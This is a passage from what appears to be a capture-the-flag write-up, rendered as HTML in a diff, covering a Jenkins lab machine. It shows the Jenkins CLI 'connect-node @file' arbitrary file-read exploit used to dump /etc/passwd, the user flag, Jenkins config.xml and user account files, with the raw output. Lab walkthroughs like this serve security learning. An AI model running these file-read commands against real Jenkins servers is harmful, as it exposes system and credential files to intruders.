style="color:#ae81ff">\x</span>00-<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">08</span>    Reports your credential and permissions.<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>02U<span style="color:#ae81ff">\x</span>08ERROR: No such command HOSTNAME<span style="color:#f92672">=</span>0f52c222a4cc<span style="color:#ae81ff">\x</span>00JENKINS_UC_EXPERIMENTAL<span style="color:#f92672">=</span>https://updates.jenkins.io/experimental<span style="color:#ae81ff">\x</span>00JAVA_HOME<span style="color:#f92672">=</span>/opt/java/openjdk<span style="color:#ae81ff">\x</span>00JENKINS_INCREMENTALS_REPO_MIRROR<span style="color:#f92672">=</span>https://repo.jenkins-ci.org/incrementals<span style="color:#ae81ff">\x</span>00COPY_REFERENCE_FILE_LOG<span style="color:#f92672">=</span>/var/jenkins_home/copy_reference_file.log<span style="color:#ae81ff">\x</span>00PWD<span style="color:#f92672">=</span>/<span style="color:#ae81ff">\x</span>00JENKINS_SLAVE_AGENT_PORT<span style="color:#f92672">=</span>50000<span style="color:#ae81ff">\x</span>00JENKINS_VERSION<span style="color:#f92672">=</span>2.441<span style="color:#ae81ff">\x</span>00HOME<span style="color:#f92672">=</span>/var/jenkins_home<span style="color:#ae81ff">\x</span>00LANG<span style="color:#f92672">=</span>C.UTF-8<span style="color:#ae81ff">\x</span>00JENKINS_UC<span style="color:#f92672">=</span>https://updates.jenkins.io<span style="color:#ae81ff">\x</span>00SHLVL<span style="color:#f92672">=</span>0<span style="color:#ae81ff">\x</span>00JENKINS_HOME<span style="color:#f92672">=</span>/var/jenkins_home<span style="color:#ae81ff">\x</span>00REF<span style="color:#f92672">=</span>/usr/share/jenkins/ref<span style="color:#ae81ff">\x</span>00PATH<span style="color:#f92672">=</span>/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<span style="color:#ae81ff">\x</span>00. Available commands are above. <span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>05<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>However this does not work well -&gt; after some more research, we discover that we can simply use the <code>jenkins-cli.jar</code>file from the instance server to make this work</p>
+<p>==&gt; We can use it to read any files with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span style="color:#e6db74">&#34;@/etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash: No such agent <span style="color:#e6db74">&#34;root:x:0:0:root:/root:/bin/bash&#34;</span> exists.
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;_apt:x:42:65534::/nonexistent:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;bin:x:2:2:bin:/bin:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent <span style="color:#e6db74">&#34;jenkins:x:1000:1000::/var/jenkins_home:/bin/bash&#34;</span> exists.
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;games:x:5:60:games:/usr/games:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent <span style="color:#e6db74">&#34;sys:x:3:3:sys:/dev:/usr/sbin/nologin&#34;</span> exists.
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync: No such agent <span style="color:#e6db74">&#34;sync:x:4:65534:sync:/bin:/bin/sync&#34;</span> exists.
+</span></span></code></pre></div><p>and we discover a user <code>jenkins</code>with home directory <code>jenkins_home</code> &ndash;&gt; we can then read the user flag with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span style="color:#e6db74">&#34;@/var/jenkins_home/user.txt&#34;</span> 
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ERROR: No such agent <span style="color:#e6db74">&#34;c1fafac37bc2bd13a195850d3f470001&#34;</span> exists.
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>After some research about <code>jenkins</code>file structure, we discover this:</p>
+<pre tabindex="0"><code>JENKINS_HOME
+ +- config.xml     (jenkins root configuration)
+ +- *.xml          (other site-wide configuration files)
+ +- userContent    (files in this directory will be served under your http://server/userContent/)
+ +- fingerprints   (stores fingerprint records)
+ +- nodes          (slave configurations)
+ +- plugins        (stores plugins)
+ +- secrets        (secretes needed when migrating credentials to other servers)
+ +- workspace (working directory for the version control system)
+     +- [JOBNAME] (sub directory for each job)
+ +- jobs
+     +- [JOBNAME]      (sub directory for each job)
+         +- config.xml     (job configuration file)
+         +- latest         (symbolic link to the last successful build)
+         +- builds
+             +- [BUILD_ID]     (for each build)
+                 +- build.xml      (build result summary)
+                 +- log            (log file)
+                 +- changelog.xml  (change log)
+</code></pre><p>We can then try to look for the <code>config.xml</code>file using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span style="color:#e6db74">&#34;@/var/jenkins_home/config.xml&#34;</span>                  
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>  &lt;primaryView&gt;all&lt;/primaryView&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;primaryView&gt;all&lt;/primaryView&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;label&gt;&lt;/label&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;label&gt;&lt;/label&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;clouds/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;clouds/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;disabledAdministrativeMonitors/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;disabledAdministrativeMonitors/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/authorizationStrategy&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/authorizationStrategy&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;hudson&gt;: No such agent <span style="color:#e6db74">&#34;&lt;hudson&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;excludeClientIPFromCrumb&gt;false&lt;/excludeClientIPFromCrumb&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;excludeClientIPFromCrumb&gt;false&lt;/excludeClientIPFromCrumb&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.model.AllView&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.model.AllView&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/crumbIssuer&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/crumbIssuer&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;disableRememberMe&gt;false&lt;/disableRememberMe&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;disableRememberMe&gt;false&lt;/disableRememberMe&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;authorizationStrategy class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.security.FullControlOnceLoggedInAuthorizationStrategy&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;authorizationStrategy class=&#34;</span>hudson.security.FullControlOnceLoggedInAuthorizationStrategy<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;viewsTabBar class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.views.DefaultViewsTabBar&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;viewsTabBar class=&#34;</span>hudson.views.DefaultViewsTabBar<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;/hudson&gt;: No such agent <span style="color:#e6db74">&#34;&lt;/hudson&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;numExecutors&gt;2&lt;/numExecutors&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;numExecutors&gt;2&lt;/numExecutors&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;disableSignup&gt;true&lt;/disableSignup&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;disableSignup&gt;true&lt;/disableSignup&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;properties class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.model.View</span>$PropertyList<span style="color:#e6db74">&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;properties class=&#34;</span>hudson.model.View$PropertyList<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/views&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/views&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;globalNodeProperties/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;globalNodeProperties/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;enableCaptcha&gt;false&lt;/enableCaptcha&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;enableCaptcha&gt;false&lt;/enableCaptcha&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;workspaceDir&gt;<span style="color:#e6db74">${</span>JENKINS_HOME<span style="color:#e6db74">}</span>/workspace/<span style="color:#e6db74">${</span>ITEM_FULL_NAME<span style="color:#e6db74">}</span>&lt;/workspaceDir&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;workspaceDir&gt;</span><span style="color:#e6db74">${</span>JENKINS_HOME<span style="color:#e6db74">}</span><span style="color:#e6db74">/workspace/</span><span style="color:#e6db74">${</span>ITEM_FULL_NAME<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/workspaceDir&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;denyAnonymousReadAccess&gt;false&lt;/denyAnonymousReadAccess&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;denyAnonymousReadAccess&gt;false&lt;/denyAnonymousReadAccess&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;scmCheckoutRetryCount&gt;0&lt;/scmCheckoutRetryCount&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;scmCheckoutRetryCount&gt;0&lt;/scmCheckoutRetryCount&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;: No such agent <span style="color:#e6db74">&#34;&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/securityRealm&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/securityRealm&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;projectNamingStrategy class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jenkins.model.ProjectNamingStrategy</span>$DefaultProjectNamingStrategy<span style="color:#e6db74">&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;projectNamingStrategy class=&#34;</span>jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;crumbIssuer class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.security.csrf.DefaultCrumbIssuer&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;crumbIssuer class=&#34;</span>hudson.security.csrf.DefaultCrumbIssuer<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;name&gt;all&lt;/name&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;name&gt;all&lt;/name&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;nodeProperties/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;nodeProperties/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;views&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;views&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;slaveAgentPort&gt;50000&lt;/slaveAgentPort&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;slaveAgentPort&gt;50000&lt;/slaveAgentPort&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;useSecurity&gt;true&lt;/useSecurity&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;useSecurity&gt;true&lt;/useSecurity&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;buildsDir&gt;<span style="color:#e6db74">${</span>ITEM_ROOTDIR<span style="color:#e6db74">}</span>/builds&lt;/buildsDir&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;buildsDir&gt;</span><span style="color:#e6db74">${</span>ITEM_ROOTDIR<span style="color:#e6db74">}</span><span style="color:#e6db74">/builds&lt;/buildsDir&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;jdks/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;jdks/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;version&gt;2.441&lt;/version&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;version&gt;2.441&lt;/version&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;owner class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson&#34;</span> reference<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../..&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;owner class=&#34;</span>hudson<span style="color:#e6db74">&#34; reference=&#34;</span>../../..<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;nodeRenameMigrationNeeded&gt;false&lt;/nodeRenameMigrationNeeded&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;nodeRenameMigrationNeeded&gt;false&lt;/nodeRenameMigrationNeeded&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;filterQueue&gt;false&lt;/filterQueue&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;filterQueue&gt;false&lt;/filterQueue&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;securityRealm class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.security.HudsonPrivateSecurityRealm&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;securityRealm class=&#34;</span>hudson.security.HudsonPrivateSecurityRealm<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;myViewsTabBar class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.views.DefaultMyViewsTabBar&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;myViewsTabBar class=&#34;</span>hudson.views.DefaultMyViewsTabBar<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.model.AllView&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.model.AllView&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;mode&gt;NORMAL&lt;/mode&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;mode&gt;NORMAL&lt;/mode&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ERROR: Error occurred <span style="color:#66d9ef">while</span> performing this command, see previous stderr output.
+</span></span></code></pre></div><p>We also discover this file <code>users.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span style="color:#e6db74">&#34;@/var/jenkins_home/users/users.xml&#34;</span>
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1.1&#39;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>?&gt;: No such agent <span style="color:#e6db74">&#34;&lt;?xml version=&#39;1.1&#39; encoding=&#39;UTF-8&#39;?&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;idToDirectoryNameMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;concurrent-hash-map&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;idToDirectoryNameMap class=&#34;</span>concurrent-hash-map<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;entry&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;entry&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;string&gt;jennifer&lt;/string&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;string&gt;jennifer&lt;/string&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;version&gt;1&lt;/version&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;version&gt;1&lt;/version&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;/hudson.model.UserIdMapper&gt;: No such agent <span style="color:#e6db74">&#34;&lt;/hudson.model.UserIdMapper&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;/idToDirectoryNameMap&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;/idToDirectoryNameMap&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;hudson.model.UserIdMapper&gt;: No such agent <span style="color:#e6db74">&#34;&lt;hudson.model.UserIdMapper&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/entry&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/entry&gt;&#34;</span> exists.
+</span></span></code></pre></div><p>and here we discover the user <code>jennifer_121...</code>&ndash;&gt; we can then try to get her config file using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span style="color:#e6db74">&#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#34;</span>
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>    &lt;hudson.tasks.Mailer_-UserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mailer@463.vedf8358e006b_&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.tasks.Mailer_-UserProperty plugin=&#34;</span>mailer@463.vedf8358e006b_<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.search.UserSearchProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.search.UserSearchProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;roles&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;roles&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;jenkins.security.seed.UserSeedProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;jenkins.security.seed.UserSeedProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;/tokenStore&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;/tokenStore&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.search.UserSearchProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.search.UserSearchProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;properties&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;properties&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;flags/&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;flags/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;hudson.model.MyViewsProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;hudson.model.MyViewsProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;/user&gt;: No such agent <span style="color:#e6db74">&#34;&lt;/user&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.ApiTokenProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/jenkins.security.ApiTokenProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;views&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;views&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>        &lt;string&gt;authenticated&lt;/string&gt;: No such agent <span style="color:#e6db74">&#34;        &lt;string&gt;authenticated&lt;/string&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display-url-api@2.200.vb_9327d658781&#34;</span>&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=&#34;</span>display-url-api@2.200.vb_9327d658781<span style="color:#e6db74">&#34;&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>&lt;user&gt;: No such agent <span style="color:#e6db74">&#34;&lt;user&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>          &lt;name&gt;all&lt;/name&gt;: No such agent <span style="color:#e6db74">&#34;          &lt;name&gt;all&lt;/name&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>  &lt;description&gt;&lt;/description&gt;: No such agent <span style="color:#e6db74">&#34;  &lt;description&gt;&lt;/description&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;collapsed/&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;collapsed/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/jenkins.security.seed.UserSeedProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/jenkins.security.seed.UserSeedProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;/hudson.model.MyViewsProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;/hudson.model.MyViewsProperty&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>      &lt;domainCredentialsMap class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hudson.util.CopyOnWriteMap</span>$Hash<span style="color:#e6db74">&#34;</span>/&gt;: No such agent <span style="color:#e6db74">&#34;      &lt;domainCredentialsMap class=&#34;</span>hudson.util.CopyOnWriteMap$Hash<span style="color:#e6db74">&#34;/&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>          &lt;filterQueue&gt;false&lt;/filterQueue&gt;: No such agent <span style="color:#e6db74">&#34;          &lt;filterQueue&gt;false&lt;/filterQueue&gt;&#34;</span> exists.
+</span></span><span style="display:flex;"><span>    &lt;jenkins.security.ApiTokenProperty&gt;: No such agent <span style="color:#e6db74">&#34;    &lt;jenkins.security.ApiTokenProperty&gt;&#34;</span> exists.
